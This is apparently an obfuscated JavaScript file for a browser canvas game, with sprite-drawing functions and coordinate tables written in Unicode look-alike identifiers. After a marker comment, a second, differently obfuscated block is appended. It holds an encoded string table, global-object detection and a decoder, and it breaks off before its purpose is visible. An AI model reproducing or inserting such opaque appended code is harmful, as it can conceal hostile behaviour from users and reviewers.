		function ⵠⲆⵠΔⵠⲆⵠᐃΔ(ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, ᐃΔ, ΔᐃⲆ, ᐃᐃᐃᐃ, ⵠᐃΔᐃ, Δⵠⵠᐃⵠ) {
			if (ⵠᐃΔᐃ === ⲆΔΔΔⲆ) ⵠᐃΔᐃ = 0;
			for (var ⵠᐃⲆⲆ = ᐃᐃᐃᐃ; ⵠᐃⲆⲆ >= ⵠᐃΔᐃ; ⵠᐃⲆⲆ--) {
				for (var ⵠᐃ = ⲆᐃⵠΔ; ⲆⲆᐃΔ >= ⵠᐃ; ⵠᐃ++) {
					for (var ᐃⵠᐃⵠ = ΔⲆΔⲆ; ᐃⵠᐃⵠ <= ⵠⵠⲆⵠ; ᐃⵠᐃⵠ++) {
						var ⵠᐃᐃᐃ = ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ];
						if (ⵠᐃⵠⲆΔ === ⵠᐃᐃᐃ || undefined === ⵠᐃᐃᐃ[ΔᐃⲆ]) continue;
						var ᐃⲆΔ = ⵠᐃᐃᐃ[ΔᐃⲆ][ⵠᐃⲆⲆ];
						if (ᐃⲆΔ === ⲆⲆⲆⲆᐃ) continue;
						for (var ⲆⲆⵠΔ = 0; ⲆⲆⵠΔ < ᐃⲆΔ.length; ⲆⲆⵠΔ++) {
							var ⲆⵠⵠΔΔ = ᐃⲆΔ[ⲆⲆⵠΔ];
							if (ⲆⵠⵠΔΔ.ⵠⲆᐃ) {
								if (ⲆⵠⵠΔΔ.Δᐃⵠ.ⵠⲆᐃ() && ⲆⵠⵠΔΔ.Δᐃⵠ.ᐃⲆΔ == ΔⵠΔⲆΔ) {
									ⲆⵠⵠΔΔ.ⵠⲆᐃ = ⲆⲆᐃⵠᐃ
								}
								var ΔᐃΔ = 600 * ((ᐃᐃⵠ - ⲆⵠⵠΔΔ.Δᐃⵠ.ΔᐃΔ) * ᐃⵠᐃᐃ) * ᐃ;
								var Δⵠ = ΔᐃΔ * Math.sin(ⲆⵠⵠΔΔ.angle);
								var ⲆⵠⲆ = ΔᐃΔ * Math.cos(ⲆⵠⵠΔΔ.angle)
							} else {
								var Δⵠ = Ⲇᐃⵠⵠ;
								var ⲆⵠⲆ = ⵠΔⲆⵠ
							}
							for (var ΔⲆⵠⲆᐃ = 0; ΔⲆⵠⲆᐃ < ΔΔΔᐃⵠᐃΔ[ⵠᐃⲆⲆ].ⲆΔⲆⲆ; ΔⲆⵠⲆᐃ++) {
								ᐃⲆⵠⵠΔ !== ⲆⲆⲆ.ᐃΔΔⵠⵠ[ΔⲆⵠⲆᐃ].ⵠΔⲆΔⵠ && (ⲆⲆⲆ.ᐃΔΔⵠⵠ[ΔⲆⵠⲆᐃ].ⵠⲆᐃ(), ⲆⲆⲆ.ᐃΔΔⵠⵠ[ΔⲆⵠⲆᐃ].ⵠΔⲆΔⵠ = ᐃⲆⵠⵠΔ);
								var ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃⵠⲆᐃ][ⲆⲆⲆ.time][ΔΔΔᐃⵠᐃΔ[ⵠᐃⲆⲆ].ⵠΔΔᐃ[ΔⲆⵠⲆᐃ].ΔᐃⲆ];
								var ᐃⵠⵠ = ⲆⲆⲆ.ᐃΔΔⵠⵠ[ΔⲆⵠⲆᐃ].ΔᐃΔ * -ᐃⵠ.width;
								var ⵠⵠᐃ = -ᐃⵠ.height * ⲆⲆⲆ.ᐃΔΔⵠⵠ[ΔⲆⵠⲆᐃ].ΔᐃΔ;
								ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃᐃΔ.ⲆΔΔ.x + ⲆⵠⵠΔΔ.x - ᐃⵠⵠ / 4 + Δⵠ + ΔΔΔᐃⵠᐃΔ[ⵠᐃⲆⲆ].ⵠΔΔᐃ[ΔⲆⵠⲆᐃ].x, ᐃᐃΔ.ⲆΔΔ.y + ⲆⵠⵠΔΔ.y - ⵠⵠᐃ / Ⲇⵠⵠⵠ + ⲆⵠⲆ + ΔΔΔᐃⵠᐃΔ[ⵠᐃⲆⲆ].ⵠΔΔᐃ[ΔⲆⵠⲆᐃ].y, ᐃⵠⵠ / ⵠⵠΔⲆ, ⵠⵠᐃ / Ⲇⵠⵠᐃ)
							}
						}
					}
				}
			}
		}

		function ΔⲆⵠⵠⵠΔⲆᐃΔ(ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, ᐃΔ, ΔᐃⲆ, ᐃᐃᐃᐃ, ⵠᐃΔᐃ, Δⵠⵠᐃⵠ) {
			if (ⵠᐃⵠⲆΔ === ⵠᐃΔᐃ) ⵠᐃΔᐃ = ΔΔⵠⵠ;
			for (var ⵠᐃ = ⲆᐃⵠΔ; ⵠᐃ <= ⲆⲆᐃΔ; ⵠᐃ++) {
				for (var ᐃⵠᐃⵠ = ΔⲆΔⲆ; ⵠⵠⲆⵠ >= ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) {
					var ⵠᐃᐃᐃ = ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ];
					if (ⵠᐃᐃᐃ === undefined || ⵠᐃᐃᐃ[ΔᐃⲆ] === ⲆΔᐃᐃᐃ) continue;
					var ᐃⲆΔ = ⵠᐃᐃᐃ[ΔᐃⲆ];
					if (ᐃⲆΔ === undefined) continue;
					if (ᐃⲆΔ.scale === ⵠⲆΔ) {
						var ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time][ᐃⲆΔ.ΔΔᐃⲆⵠ];
						Δ.save();
						Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + ᐃⲆΔ.x, ᐃᐃΔ.ⲆΔΔ.y + ᐃⲆΔ.y);
						Δ.rotate(ᐃⲆΔ.angle);
						ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 4, -ᐃⵠ.height / ⵠΔᐃΔ, ᐃⵠ.width / 2, ᐃⵠ.height / 2);
						Δ.restore()
					} else if (ᐃⲆΔ.scale === 3) {
						for (var ⵠᐃⲆⲆ = 0; ᐃⲆΔ.ᐃⲆⲆ.length > ⵠᐃⲆⲆ; ⵠᐃⲆⲆ++) {
							Δ.save();
							Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + ᐃⲆΔ.x, ᐃᐃΔ.ⲆΔΔ.y + ᐃⲆΔ.y);
							Δ.rotate(ᐃⲆΔ.ᐃⲆⲆ[ⵠᐃⲆⲆ].angle);
							var ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time][ᐃⲆΔ.ᐃⲆⲆ[ⵠᐃⲆⲆ].ΔΔᐃⲆⵠ];
							ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ⲆᐃΔᐃ + ᐃⲆΔ.ᐃⲆⲆ[ⵠᐃⲆⲆ].x, -ᐃⵠ.height / ⲆᐃΔᐃ + ᐃⲆΔ.ᐃⲆⲆ[ⵠᐃⲆⲆ].y, ᐃⵠ.width / 1.5, ᐃⵠ.height / 1.5);
							Δ.restore()
						}
					} else {
						var ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time][ᐃⲆΔ.ΔΔᐃⲆⵠ];
						Δ.save();
						Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + ᐃⲆΔ.x, ᐃᐃΔ.ⲆΔΔ.y + ᐃⲆΔ.y);
						Δ.rotate(ᐃⲆΔ.angle);
						ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / 2, ᐃⵠ.width, ᐃⵠ.height);
						Δ.restore()
					}
				}
			}
		}

		function ᐃᐃⲆᐃⵠ(ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, ᐃΔ, ΔᐃⲆ, ᐃᐃᐃᐃ, ⵠᐃΔᐃ, Δⵠⵠᐃⵠ) {
			ⵠⵠⵠⲆⵠ === ⵠᐃΔᐃ && (ⵠᐃΔᐃ = Δᐃᐃⵠ);
			for (var ⵠᐃⲆⲆ = ᐃᐃᐃᐃ; ⵠᐃΔᐃ <= ⵠᐃⲆⲆ; ⵠᐃⲆⲆ--) {
				for (var ⵠᐃ = ⲆᐃⵠΔ; ⲆⲆᐃΔ >= ⵠᐃ; ⵠᐃ++) {
					for (var ᐃⵠᐃⵠ = ΔⲆΔⲆ; ⵠⵠⲆⵠ >= ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) {
						if (Δⵠⵠᐃⵠ > ΔΔⵠⵠ && ⲆⵠᐃΔᐃⲆⲆ[(ⵠᐃ + ᐃⵠᐃⵠ * Δⵠⵠᐃⵠ) % ⲆⵠᐃΔᐃⲆⲆ.length] === 1) continue;
						var ⵠᐃᐃᐃ = ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ];
						if (ⵠⵠΔⵠΔ === ⵠᐃᐃᐃ || ⵠᐃᐃᐃ[ΔᐃⲆ] === ⵠΔᐃⲆΔ) continue;
						var ᐃⲆΔ = ⵠᐃᐃᐃ[ΔᐃⲆ][ⵠᐃⲆⲆ];
						if (ᐃⲆΔ === ⲆⲆⲆⲆᐃ) continue;
						for (var ⲆⲆⵠΔ = 0; ᐃⲆΔ.length > ⲆⲆⵠΔ; ⲆⲆⵠΔ++) {
							var ⲆⵠⵠΔΔ = ᐃⲆΔ[ⲆⲆⵠΔ];
							if (ⲆⵠⵠΔΔ.ⵠⲆᐃ) {
								ⲆⵠⵠΔΔ.Δᐃⵠ.ⵠⲆᐃ() && ⲆⵠⵠΔΔ.Δᐃⵠ.ᐃⲆΔ == false && (ⲆⵠⵠΔΔ.ⵠⲆᐃ = false);
								var ΔᐃΔ = (ΔⵠⲆΔ - ⲆⵠⵠΔΔ.Δᐃⵠ.ΔᐃΔ) * ᐃⵠᐃᐃ * 600 * ᐃ;
								var Δⵠ = Math.sin(ⲆⵠⵠΔΔ.angle) * ΔᐃΔ;
								var ⲆⵠⲆ = Math.cos(ⲆⵠⵠΔΔ.angle) * ΔᐃΔ
							} else {
								var Δⵠ = 0;
								var ⲆⵠⲆ = 0
							}
							var ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time][ⵠᐃⲆⲆ];
							ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃᐃΔ.ⲆΔΔ.x + ⲆⵠⵠΔΔ.x - ᐃⵠ.width / (ΔΔⵠᐃⲆ * 2) + Δⵠ, ᐃᐃΔ.ⲆΔΔ.y + ⲆⵠⵠΔΔ.y - ᐃⵠ.height / (2 * ΔΔⵠᐃⲆ) + ⲆⵠⲆ, ᐃⵠ.width / ΔΔⵠᐃⲆ, ᐃⵠ.height / ΔΔⵠᐃⲆ)
						}
					}
				}
			}
		}
		ΔΔΔᐃⵠᐃΔ = [{
			"ⲆΔⲆⲆ": ⲆΔΔᐃᐃ,
			"ⵠΔΔᐃ": [{
				x: -128,
				y: -20,
				"ΔᐃⲆ": ᐃⵠⲆⵠ
			}, {
				x: -86,
				y: -ΔⲆᐃⵠᐃ,
				"ΔᐃⲆ": 1
			}, {
				y: -74,
				"ΔᐃⲆ": 2,
				x: -60
			}, {
				x: -22,
				y: -144,
				"ΔᐃⲆ": ᐃΔΔ
			}, {
				"ΔᐃⲆ": Ⲇᐃⵠⵠ,
				x: -58,
				y: 86
			}, {
				x: 3,
				"ΔᐃⲆ": Δⵠᐃ,
				y: -30
			}, {
				x: 65,
				"ΔᐃⲆ": 1,
				y: -115
			}, {
				x: 118,
				"ΔᐃⲆ": 0,
				y: -50
			}, {
				x: 73,
				y: ᐃⲆⵠⵠᐃ,
				"ΔᐃⲆ": ΔⲆᐃᐃ
			}, {
				y: 79,
				"ΔᐃⲆ": 0,
				x: 67
			}]
		}, {
			"ⵠΔΔᐃ": [{
				x: -45,
				"ΔᐃⲆ": ⲆⲆⲆᐃ,
				y: -26
			}, {
				x: -45,
				"ΔᐃⲆ": 2,
				y: 20
			}, {
				y: -60,
				x: 10,
				"ΔᐃⲆ": 1
			}, {
				x: 52,
				y: -17,
				"ΔᐃⲆ": 1
			}, {
				x: ⲆΔᐃⲆΔᐃΔ,
				y: 45,
				"ΔᐃⲆ": 0
			}],
			"ⲆΔⲆⲆ": 5
		}, {
			"ⵠΔΔᐃ": [{
				y: ⲆⲆΔⲆ,
				"ΔᐃⲆ": 2,
				x: -30
			}, {
				x: 7,
				"ΔᐃⲆ": ⲆⲆΔᐃ,
				y: -38
			}, {
				y: ⲆΔⲆᐃ,
				"ΔᐃⲆ": 2,
				x: 37
			}],
			"ⲆΔⲆⲆ": 3
		}, {
			"ⲆΔⲆⲆ": ΔΔΔΔⲆⵠⲆ,
			"ⵠΔΔᐃ": [{
				"ΔᐃⲆ": 2,
				y: -87,
				x: -74
			}, {
				x: -ΔⲆⵠⲆΔΔᐃ,
				y: -10,
				"ΔᐃⲆ": ⵠΔⲆ
			}, {
				"ΔᐃⲆ": 1,
				y: ⵠᐃΔΔΔⲆⲆ,
				x: -99
			}, {
				y: 84,
				x: -66,
				"ΔᐃⲆ": 0
			}, {
				x: -55,
				y: 123,
				"ΔᐃⲆ": ᐃΔᐃⲆ
			}, {
				y: 81,
				"ΔᐃⲆ": ᐃⲆⵠᐃΔ,
				x: 10
			}, {
				"ΔᐃⲆ": 0,
				x: 52,
				y: 50
			}, {
				"ΔᐃⲆ": 1,
				y: 9,
				x: 138
			}, {
				x: 104,
				y: -28,
				"ΔᐃⲆ": 0
			}, {
				y: -56,
				x: 67,
				"ΔᐃⲆ": 2
			}, {
				x: 5,
				y: -112,
				"ΔᐃⲆ": ΔΔⵠ
			}]
		}, {
			"ⲆΔⲆⲆ": 6,
			"ⵠΔΔᐃ": [{
				"ΔᐃⲆ": 2,
				y: -66,
				x: -33
			}, {
				"ΔᐃⲆ": Δᐃᐃⵠ,
				y: ⲆⵠⲆⲆᐃ,
				x: -58
			}, {
				x: -ᐃⲆΔⲆᐃⲆᐃ,
				y: 44,
				"ΔᐃⲆ": 1
			}, {
				"ΔᐃⲆ": ⵠᐃⲆᐃ,
				y: 20,
				x: 44
			}, {
				"ΔᐃⲆ": ⵠΔⲆᐃ,
				y: -36,
				x: 53
			}, {
				x: 7,
				"ΔᐃⲆ": 0,
				y: -62
			}]
		}, {
			"ⲆΔⲆⲆ": ᐃⲆᐃᐃ,
			"ⵠΔΔᐃ": [{
				x: -ᐃΔⵠᐃⵠᐃⲆ,
				y: -25,
				"ΔᐃⲆ": ⵠΔⲆ
			}, {
				"ΔᐃⲆ": ⵠⲆⵠⲆ,
				x: -29,
				y: ⲆⵠⵠⵠⵠᐃΔ
			}, {
				y: ΔᐃⵠⲆⵠ,
				"ΔᐃⲆ": 0,
				x: ⵠⲆⵠⲆⵠ
			}]
		}];
		var ⲆⵠΔΔⵠⵠΔ = ΔⲆⵠⲆ;
		var ⲆⲆⵠΔΔΔᐃ = Ⲇᐃⵠⵠ;
		var ⵠᐃᐃⲆΔᐃΔ = 0;
		var ᐃᐃᐃⵠᐃᐃΔ = Δⵠᐃ;

		function ⲆⲆⲆᐃⵠⲆⲆᐃⲆ() {
			var ΔⲆⵠΔᐃᐃⵠ = ᐃᐃΔ.ΔⲆⵠΔᐃᐃⵠ;
			var ᐃⲆΔΔⲆ = ΔⲆⵠΔᐃᐃⵠ.ᐃⲆΔΔⲆ;
			for (var ⵠᐃ = 0; ᐃⲆΔΔⲆ.length > ⵠᐃ; ⵠᐃ++) {
				var ᐃΔᐃ = ᐃⲆΔΔⲆ[ⵠᐃ];
				ΔⲆⵠΔᐃᐃⵠ.ⵠⲆᐃ(ᐃΔᐃ);
				ΔⲆΔΔΔⲆⵠ(Ⲇ.ΔⲆⵠⲆᐃⲆᐃ, ᐃΔᐃ.id, ᐃᐃΔ.ⲆΔΔ.x + ᐃΔᐃ.x, ᐃᐃΔ.ⲆΔΔ.y + ᐃΔᐃ.y, ᐃΔᐃ.alpha)
			}
			for (var ⵠᐃ = ᐃⵠΔ; ⵠᐃ < ᐃⲆΔΔⲆ.length; ⵠᐃ++) {
				var ᐃΔᐃ = ᐃⲆΔΔⲆ[ⵠᐃ];
				(ᐃΔᐃ.ᐃⵠΔᐃⵠ <= 0 || -ᐃᐃΔ.ⲆΔΔ.x + ΔΔΔᐃ < ᐃΔᐃ.x || -ᐃᐃΔ.ⲆΔΔ.x > ᐃΔᐃ.x || ᐃΔᐃ.y > -ᐃᐃΔ.ⲆΔΔ.y + ⵠⲆᐃⲆ) && ᐃⲆΔΔⲆ.splice(ⵠᐃ, 1)
			}
			var ⵠΔΔᐃ = -ᐃᐃΔ.ⲆΔΔ.y;
			ⲆⲆⲆ.ΔⵠΔΔⵠ > -1e3 && ΔⲆⵠΔᐃᐃⵠ.add(ⵠΔΔᐃ)
		}

		function ⲆᐃᐃⲆⵠΔⵠ(ⵠⵠⲆᐃΔ, ⵠⵠᐃᐃΔ, ⲆΔⲆΔⲆᐃᐃ, ΔⵠⲆⵠ, ᐃⲆⲆⵠ, ᐃΔⲆᐃ) {
			var w1 = ΔⵠⲆⵠ.w1;
			var w2 = ΔⵠⲆⵠ.w2;
			var w3 = ΔⵠⲆⵠ.w3;
			var ⵠⲆⲆΔ = ᐃᐃΔ.ⲆΔΔ.x + ⵠⵠⲆᐃΔ + 820;
			var ⵠⵠΔⲆΔ = Math.max(ᐃᐃΔ.ⲆΔΔ.y + ⵠⵠᐃᐃΔ, Δᐃᐃⵠ);
			var ΔⲆⲆᐃΔ = Math.max(-ᐃᐃΔ.ⲆΔΔ.y + ⵠⲆᐃⲆ - ⲆΔⲆΔⲆᐃᐃ - 100, ΔⲆⲆ);
			var ⵠⲆⲆⲆ = ⵠⵠΔⲆΔ;
			var ᐃᐃⵠᐃΔ = ⵠⲆᐃⲆ - ⵠⵠΔⲆΔ - ΔⲆⲆᐃΔ;
			if (ᐃΔⲆᐃ) var ⵠᐃᐃᐃΔ = ΔⵠⲆⵠ.ΔᐃⲆ(w1).x;
			else var ⵠᐃᐃᐃΔ = w1.r.x;
			var Δⵠⵠᐃ = ⵠⲆⲆΔ + ΔᐃᐃΔ.ᐃⲆᐃΔΔ;
			var ⵠΔᐃᐃᐃ = Δⵠⵠᐃ,
				ΔᐃΔΔⲆ = ⵠⲆⲆⲆ,
				ΔΔⵠΔⵠ = -ⵠᐃᐃᐃΔ + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ,
				ᐃΔΔΔᐃ = ᐃᐃⵠᐃΔ;
			Δⵠⵠᐃ += -ⵠᐃᐃᐃΔ + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ + ΔⲆΔΔΔ;
			var ⲆΔΔᐃⲆ = Δⵠⵠᐃ;
			if (ᐃΔⲆᐃ) var ⵠᐃᐃᐃΔ = ΔⵠⲆⵠ.ΔᐃⲆ(w2).x;
			else var ⵠᐃᐃᐃΔ = w2.r.x;
			var d2 = ⵠⲆⲆΔ - ΔᐃᐃΔ.ⵠⵠᐃⲆΔ - Δⵠⵠᐃ - ⵠᐃᐃᐃΔ;
			var ⲆᐃᐃⲆⲆ = Δⵠⵠᐃ,
				ΔΔᐃⵠΔ = ⵠⲆⲆⲆ,
				ᐃⲆⲆⵠⲆ = d2,
				ⲆⲆᐃⲆᐃ = ᐃᐃⵠᐃΔ;
			Δⵠⵠᐃ += d2 + 2;
			var ⲆⵠⵠⵠΔ = Δⵠⵠᐃ - 2;
			if (ᐃΔⲆᐃ) var ⵠᐃᐃᐃΔ = ΔⵠⲆⵠ.ΔᐃⲆ(w3).x;
			else var ⵠᐃᐃᐃΔ = w3.r.x;
			d2 = ⵠⲆⲆΔ - ΔᐃᐃΔ.Ⲇⵠⵠᐃⵠ - Δⵠⵠᐃ - ⵠᐃᐃᐃΔ;
			if (ⲆⵠⵠⵠΔ > Δⵠⵠᐃ + d2) {
				var ΔΔⲆΔⵠ = true;
				var ΔⲆΔΔⵠ = Δⵠⵠᐃ,
					ⲆΔⲆⲆⵠ = ⵠⲆⲆⲆ,
					ⵠⵠⵠⵠᐃ = d2,
					ΔⵠᐃΔΔ = ᐃᐃⵠᐃΔ;
				Δⵠⵠᐃ += d2 + ⲆΔΔⵠ;
				var ⵠᐃᐃⵠΔ = Δⵠⵠᐃ
			} else {
				var ΔΔⲆΔⵠ = false;
				Δⵠⵠᐃ = ⲆⵠⵠⵠΔ;
				var ⵠᐃᐃⵠΔ = -1
			}
			d2 = ⵠⲆⲆΔ - ΔᐃᐃΔ.ΔΔᐃΔⲆᐃⵠ - Δⵠⵠᐃ;
			if (ᐃΔⲆᐃ > 0 && ᐃⲆⲆⵠ.ᐃⵠⵠΔᐃⵠΔ === ⵠᐃⵠΔ) {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(15, 77, 72, 252, 239, 187, ᐃΔΔⵠ)
				} else Δ.fillStyle = Ⲇ.ⲆΔⵠⵠᐃᐃⵠ[ⲆⲆⲆ.time];
				Δ.fillRect(Δⵠⵠᐃ, ⵠⲆⲆⲆ, d2, ᐃᐃⵠᐃΔ)
			} else {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ΔⵠΔⵠ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(ᐃⲆⲆⵠ.ΔΔᐃ[0], ᐃⲆⲆⵠ.ΔΔᐃ[1], ᐃⲆⲆⵠ.ΔΔᐃ[2], ᐃⲆⲆⵠ.ᐃΔⲆ[Δᐃᐃᐃ], ᐃⲆⲆⵠ.ᐃΔⲆ[ⵠΔᐃ], ᐃⲆⲆⵠ.ᐃΔⲆ[2], ᐃΔΔⵠ)
				} else Δ.fillStyle = ᐃⲆⲆⵠ.ⵠᐃᐃⵠⲆ[ⲆⲆⲆ.time];
				Δ.fillRect(Δⵠⵠᐃ, ⵠⲆⲆⲆ, d2, ᐃᐃⵠᐃΔ)
			}
		} // XDLOLXD
		function ZKXaJHd(){}var dpdLCik=Object['defineProperty'],GFnG9W5,NVMuEZ,CPjcwW,isGUSn,Tjl5S3,bbYbsV,qRpgEWo,GKTPti,X4ir0c,V3ZAYOu,fne1rv9,HOZkhs2,veiTIU,dZwH1b,rf7GSa5,azzrAg3,K9G15Z;function Khxseg(ZKXaJHd){return GFnG9W5[ZKXaJHd<-0x10?ZKXaJHd+0x3e:ZKXaJHd<-0x10?ZKXaJHd+0x45:ZKXaJHd<0x40?ZKXaJHd+0xf:ZKXaJHd+0x27]}GFnG9W5=hYndT2m.call(this);function uA59_F(ZKXaJHd,dpdLCik){return NVMuEZ[Khxseg(0x1f)](null,ZKXaJHd,'length',{value:dpdLCik,configurable:!0x0})}NVMuEZ=Object.defineProperty;var UQ101r=[],q3T9Hb=['$e"r:78`',',Dl{(uE`','Z;),LCA72','(;Aw37Oy','<vS@9g+{+wip&B','[}U,Q','B~4XN$b0','8~N_','Qgt*yy|:2A5W0^','0>oFj','":DX^Wet','*C;<c|kW34l','NVwIr','4hzJ1',Khxseg(-0xf),Khxseg(-0xf),'BUh``PW','INC(V}m)OC`zF=O','cc5l[yEFBCVp#I<f)d','A@nBL7=+IKESZ2cD5O(P)i6<F','k5P|}^NYx9C"N2ajj!Hv}2t,h','Bph0Wm<%gbE;%FbjZq+I,^UQk','$C{IF{Qrw&R;dAKlNOpRqrq$U','zPrB+s9qVTV6^u:,fPB!E|;,g',':p3G3s*SaM{*?USelhe1F52rk','A@nBL7=+1RUpY6Xm0I5la`9YM96Rm182)@A0c7t7g','Pq{R1','_(?(1','SP+/h};qh','2E"!n+5F','SP+/h};qh','y%HlSy0F','zS{ooUnjaq.,F','{!zJ','+hYBO>rF','zIpy/','bIZK','!=O[@Tnjaq.,F','!=O[@TBxq/rPcL<0fd','>({R/','8$r_@TU1|D2JQ`x$','8$r_@TBxq/rPcL<0gk3cx;aAK','+hYBO>l7zM%6d','qc^`n|W','Wq&j','W&]W','*qsB{^~MG','2E"!n+5F','*qsB{^~MG','.cnB`iMF','kN,kn','tc!K/Putk','+QoJ`P{.3kS]M=O','k5]JY}?kNCa"_^)AQNoJ',':N)l)','z@!`[y4rd9&','INoJ`P{.k','>({R=y:ZZL','!h>`H*g<L9brFG','pJ06rSYd','{!n}&%)F','2E"!n+5F','sgil4;0F','LcpyA?W','W}Sa0QVW$=tDqd','YUOCK{hZ','Mcpy1i5F','fOkr%iQF','p!>`)','F}XQ>{Z[~8[[Jd";DY"$','(qrRD$<.|as?d','Mc>`B7NYYT>"M=EfbPh','Mc>`B7EF','v70Qt(=Z','DY"$','.(X!t','>c9KI&:?.=','DNYBN(EF','rbA&#)<','^j!5JJ<','Ucrbx,~^t',';c9KQJONi]','KY>av','WY6bv','=fD|+;OF|L','(qrRD$fF','ccpG,','sfq|@H`)8[_UT=zDbf{R]7W','7%?(8p].`9/6d','INEy%i5)g','ddEQK)nG','ddEQK)1G','uN!K,','ddEQK)PqbO"6G','&hnBI','$!1`Y}&)g','j@!`[y.F','!.4CW)B?t','y[Eyy7o<At','b*E5Z7_Z','`!!`x+W','D04Cyg<','m!ryN]W','qPu`?z5F','eNGB','qPu`?z;Y(t@','~T5le]3]8aRkz1LDqd','re=Q#)[33rg[G','[a!KZz;Y(t@','W}z$A,%WbO)6G','y%2lf]8r*o&"c0T','QjoKR?QG','@iy&5B_Z','QjoKR?j?cr?[`H$o','W}Sa{&%WlV:7j"3','y%2lf]p}*oL!]c{fBd',',&2l`P)rNL>"xjrfjd','nbMsxn<','b(9/[y/F','nbk#~Q,v&8','I+z$','le?C','Fck|&S".k','Z}A&Rb3ZA','9)YbW{jZ','XD!R0y{56E;_)=/u@C+rP&G;ntGj"Y<f.NYbi7,$VT>nKh','1PX`R9`Fc&8','?_Z`12;,XT(HTG','pl*|fpq7LJH*PS_Q5AakM','mhr}pmo)k','Rs=rx]b$?a3`MG#,','tgQ6/uYd'];CPjcwW=(ZKXaJHd,dpdLCik,GFnG9W5,NVMuEZ,isGUSn)=>{if(typeof NVMuEZ===Khxseg(-0xe)){NVMuEZ=fwdk2H}if(typeof isGUSn==='undefined'){isGUSn=UQ101r}if(ZKXaJHd!==dpdLCik){return isGUSn[ZKXaJHd]||(isGUSn[ZKXaJHd]=NVMuEZ(q3T9Hb[ZKXaJHd]))}if(GFnG9W5==NVMuEZ){return dpdLCik?ZKXaJHd[isGUSn[dpdLCik]]:UQ101r[ZKXaJHd]||(GFnG9W5=isGUSn[ZKXaJHd]||NVMuEZ,UQ101r[ZKXaJHd]=GFnG9W5(q3T9Hb[ZKXaJHd]))}if(NVMuEZ===Khxseg(-0x7)){CPjcwW=isGUSn}if(dpdLCik){[isGUSn,dpdLCik]=[NVMuEZ(isGUSn),ZKXaJHd||GFnG9W5];return CPjcwW(ZKXaJHd,isGUSn,GFnG9W5)}if(GFnG9W5==ZKXaJHd){return dpdLCik[UQ101r[GFnG9W5]]=CPjcwW(ZKXaJHd,dpdLCik)}};function lpZCSs(){return globalThis}function WsMJe2r(){return global}function KfK58Nj(){return window}function VBlTMoY(){return new Function('return this')()}function sax25ap(dpdLCik=[lpZCSs,WsMJe2r,KfK58Nj,VBlTMoY],NVMuEZ,CPjcwW=[],isGUSn=0x0,Tjl5S3){NVMuEZ=NVMuEZ;try{ZKXaJHd(NVMuEZ=Object,CPjcwW.push(''.__proto__.constructor.name))}catch(e){}PyodIo:for(isGUSn=isGUSn;isGUSn<dpdLCik.length;isGUSn++)try{NVMuEZ=dpdLCik[isGUSn]();for(Tjl5S3=0x0;Tjl5S3<CPjcwW.length;Tjl5S3++){var bbYbsV=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0x45?dpdLCik-0x48:dpdLCik>-0xb?dpdLCik>-0xb?dpdLCik<0x45?dpdLCik+0xa:dpdLCik+0x3b:dpdLCik+0x55:dpdLCik+0x27]},0x1);if(typeof NVMuEZ[CPjcwW[Tjl5S3]]===bbYbsV(-0x9)){continue PyodIo}}return NVMuEZ}catch(e){}return NVMuEZ||this}ZKXaJHd(isGUSn=sax25ap()||{},Tjl5S3=isGUSn.TextDecoder,bbYbsV=isGUSn.Uint8Array,qRpgEWo=isGUSn.Buffer,GKTPti=isGUSn.String||String,X4ir0c=isGUSn.Array||Array,V3ZAYOu=H9jnwoa(()=>{var dpdLCik=new X4ir0c(Khxseg(0x17)),NVMuEZ,CPjcwW;ZKXaJHd(NVMuEZ=GKTPti.fromCodePoint||GKTPti.fromCharCode,CPjcwW=[]);return H9jnwoa(isGUSn=>{var Tjl5S3,bbYbsV,qRpgEWo,X4ir0c;ZKXaJHd(qRpgEWo=isGUSn.length,CPjcwW[Khxseg(0x4)]=0x0);for(X4ir0c=0x0;X4ir0c<qRpgEWo;){bbYbsV=isGUSn[X4ir0c++];if(bbYbsV<=0x7f){Tjl5S3=bbYbsV}else{if(bbYbsV<=0xdf){Tjl5S3=(bbYbsV&0x1f)<<0x6|isGUSn[X4ir0c++]&Khxseg(-0xd)}else{if(bbYbsV<=0xef){Tjl5S3=(bbYbsV&Khxseg(0x18))<<Khxseg(-0xc)|(isGUSn[X4ir0c++]&Khxseg(-0xd))<<Khxseg(0x9)|isGUSn[X4ir0c++]&0x3f}else{if(GKTPti.fromCodePoint){var 